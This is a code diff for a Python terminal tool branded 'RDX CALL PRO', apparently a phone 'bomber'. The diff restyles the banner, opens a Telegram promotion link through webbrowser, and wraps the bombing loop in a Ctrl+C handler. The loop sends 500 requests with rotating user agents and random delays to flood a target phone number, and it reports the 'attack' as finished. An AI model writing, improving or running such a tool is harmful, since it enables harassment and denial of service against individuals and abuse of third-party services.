@@ -4,6 +4,7 @@ import time
 import random
 import requests
 import re
+import webbrowser
 
 # ANSI Color Codes for Styling
 GREEN = "\033[92m"
@@ -16,6 +17,9 @@ BLUE = "\033[94m"
 WHITE = "\033[97m"
 RESET = "\033[0m"
 DIM = "\033[2m"
+
+# Telegram Channel Link
+TELEGRAM_LINK = "https://t.me/rdx_tools"
 
 # Restricted Numbers Blacklist (Normalized formats)
 RESTRICTED_NUMBERS = {
@@ -31,7 +35,6 @@ def get_terminal_width():
 
 def center_text(text, color=GREEN):
     width = get_terminal_width()
-    # Strip ANSI codes to calculate visual length
     clean = re.sub(r'\033\[[0-9;]*m', '', text)
     padding = max((width - len(clean)) // 2, 0)
     return " " * padding + text
@@ -81,20 +84,24 @@ def pulse_text(text, color=MAGENTA, pulses=2):
 
 def banner():
     os.system("clear")
-    width = get_terminal_width()
-    line = "─" * min(width - 4, 62)
+    box_width = 60
+    border_top = "╔" + "═" * box_width + "╗"
+    border_mid = "╠" + "═" * box_width + "╣"
+    border_bot = "╚" + "═" * box_width + "╝"
     
-    banner_text = f"""
-{MAGENTA}{BOLD}  ╔{'═' * (min(width - 6, 60))}╗{RESET}
-{MAGENTA}{BOLD}  ║{RESET}{CYAN}{BOLD}{center_text('⚡  R D X   C A L L   P R O  ⚡', CYAN)[0:min(width - 8, 58)]:<{min(width - 8, 58)}}{RESET}{MAGENTA}{BOLD}║{RESET}
-{MAGENTA}{BOLD}  ╚{'═' * (min(width - 6, 60))}╝{RESET}
+    title = "⚡ RDX CALL PRO ⚡"
+    title_pad = (box_width - len(title)) // 2
+    title_line = "║" + " " * title_pad + f"{CYAN}{BOLD}{title}{RESET}" + " " * (box_width - len(title) - title_pad) + "║"
 
-{CYAN}{BOLD}  ┌{'─' * (min(width - 6, 60))}┐{RESET}
-{YELLOW}{BOLD}  │{RESET}  {WHITE}DEVELOPER  {DIM}»{RESET} {GREEN}{BOLD}RDX  HUNTER{RESET}{' ' * max(min(width - 6, 60) - 32, 0)}{YELLOW}{BOLD}│{RESET}
-{YELLOW}{BOLD}  │{RESET}  {WHITE}TELEGRAM   {DIM}»{RESET} {GREEN}{BOLD}RDX  TOOLS{RESET}{' ' * max(min(width - 6, 60) - 37, 0)}{YELLOW}{BOLD}│{RESET}
-{YELLOW}{BOLD}  │{RESET}  {WHITE}VERSION    {DIM}»{RESET} {GREEN}{BOLD}v1.0  PRO{RESET}{' ' * max(min(width - 6, 60) - 27, 0)}{YELLOW}{BOLD}│{RESET}
-{YELLOW}{BOLD}  │{RESET}  {WHITE}STATUS     {DIM}»{RESET} {GREEN}{BOLD}● ONLINE{RESET}{' ' * max(min(width - 6, 60) - 29, 0)}{YELLOW}{BOLD}│{RESET}
-{CYAN}{BOLD}  └{'─' * (min(width - 6, 60))}┘{RESET}
+    banner_text = f"""
+{MAGENTA}{BOLD}  {border_top}{RESET}
+{MAGENTA}{BOLD}  {title_line}{RESET}
+{MAGENTA}{BOLD}  {border_mid}{RESET}
+{YELLOW}{BOLD}  ║{RESET}  {WHITE}DEVELOPER  {DIM}»{RESET} {GREEN}{BOLD}RDX  HUNTER{RESET}{' ' * (box_width - 32)}{YELLOW}{BOLD}║{RESET}
+{YELLOW}{BOLD}  ║{RESET}  {WHITE}TELEGRAM   {DIM}»{RESET} {GREEN}{BOLD}RDX  TOOLS{RESET}{' ' * (box_width - 37)}{YELLOW}{BOLD}║{RESET}
+{YELLOW}{BOLD}  ║{RESET}  {WHITE}VERSION    {DIM}»{RESET} {GREEN}{BOLD}v1.0  PRO{RESET}{' ' * (box_width - 27)}{YELLOW}{BOLD}║{RESET}
+{YELLOW}{BOLD}  ║{RESET}  {WHITE}STATUS     {DIM}»{RESET} {GREEN}{BOLD}● ONLINE{RESET}{' ' * (box_width - 29)}{YELLOW}{BOLD}║{RESET}
+{MAGENTA}{BOLD}  {border_bot}{RESET}
 """
     print(banner_text)
 
@@ -106,8 +113,14 @@ def welcome_sequence():
     smooth_loading_bar(1.0, "Loading Modules")
     smooth_loading_bar(0.8, "Connecting API")
     pulse_text("✦ SYSTEM READY ✦", color=GREEN, pulses=2)
+    
     print(f"{GREEN}{BOLD}  ➤ Joining Telegram Channel...{RESET}")
-    os.system("xdg-open https://t.me/+e5Rr0q5ixnxlNTNl > /dev/null 2>&1 &")
+    try:
+        webbrowser.open(TELEGRAM_LINK)
+    except Exception:
+        print(f"{RED}{BOLD}  [!] Could not open browser automatically.{RESET}")
+        print(f"{YELLOW}  [!] Please visit manually: {TELEGRAM_LINK}{RESET}")
+    
     time.sleep(1.3)
     print()
 
@@ -164,31 +177,43 @@ def start_bombing(phone_number):
     print(f"{CYAN}{BOLD}  └{'─' * width}┘{RESET}\n")
 
     bar_len = 30
-    for i in range(1, 501):
-        headers = {
-            "User-Agent": get_random_user_agent(),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Connection": "keep-alive"
-        }
+    
+    # পুরো লুপটাকে try...except KeyboardInterrupt দিয়ে ঘেরা হলো
+    try:
+        for i in range(1, 501):
+            headers = {
+                "User-Agent": get_random_user_agent(),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Connection": "keep-alive"
+            }
 
-        try:
-            requests.get(url, headers=headers, timeout=8)
-            success_count += 1
-            progress = int((i / 500) * 100)
-            filled = int((i / 500) * bar_len)
-            bar = "█" * filled + "░" * (bar_len - filled)
+            # ভেতরের এরর হ্যান্ডলিং
+            try:
+                requests.get(url, headers=headers, timeout=8)
+                success_count += 1
+                progress = int((i / 500) * 100)
+                filled = int((i / 500) * bar_len)
+                bar = "█" * filled + "░" * (bar_len - filled)
+                
+                sys.stdout.write(
+                    f"\r  {CYAN}{BOLD}▕{GREEN}{bar}{CYAN}▏{RESET} "
+                    f"{YELLOW}{BOLD}{progress:3d}%{RESET}  "
+                    f"{MAGENTA}{BOLD}[RDX HIT #{success_count:03d}]{RESET}   "
+                )
+                sys.stdout.flush()
+            except Exception:
+                # নেটওয়ার্ক এরর হলে চুপচাপ স্কিপ করবে
+                pass
+
+            # আপনার ১ থেকে ২ সেকেন্ডের ডিলে অক্ষত রাখা হয়েছে
+            time.sleep(random.uniform(1.0, 2.0))
             
-            sys.stdout.write(
-                f"\r  {CYAN}{BOLD}▕{GREEN}{bar}{CYAN}▏{RESET} "
-                f"{YELLOW}{BOLD}{progress:3d}%{RESET}  "
-                f"{MAGENTA}{BOLD}[RDX HIT #{success_count:03d}]{RESET}   "
-            )
-            sys.stdout.flush()
-        except Exception:
-            pass
-
-        time.sleep(random.uniform(1.0, 2.0))
+    except KeyboardInterrupt:
+        # ইউজার Ctrl+C চাপলে ঠিক এখানে আসবে
+        print(f"\n\n  {RED}{BOLD}[!] Process Interrupted by User (Ctrl+C).{RESET}")
+        print(f"  {YELLOW}{BOLD}[*] Returning to Main Menu...{RESET}\n")
+        return # সুন্দরভাবে মেইন মেনুতে ফিরে যাবে, কোনো লাল এরর আসবে না
 
     print(f"\n\n{CYAN}{BOLD}  ┌{'─' * width}┐{RESET}")
     print(f"{CYAN}{BOLD}  │{RESET}  {GREEN}{BOLD}✓ ATTACK FINISHED SUCCESSFULLY{RESET}{' ' * (width - 33)}{CYAN}{BOLD}│{RESET}")
@@ -217,7 +242,10 @@ def main():
                 print(f"{RED}{BOLD}  [!] Invalid Number! Try again.{RESET}")
                 time.sleep(1.5)
         elif choice == "2":
-            os.system("xdg-open https://t.me/+e5Rr0q5ixnxlNTNl > /dev/null 2>&1 &")
+            try:
+                webbrowser.open(TELEGRAM_LINK)
+            except Exception:
+                print(f"{RED}{BOLD}  [!] Could not open browser automatically.{RESET}")
             print(f"{GREEN}{BOLD}  [+] Opening Telegram Channel...{RESET}")
             time.sleep(1.5)
         elif choice == "3":
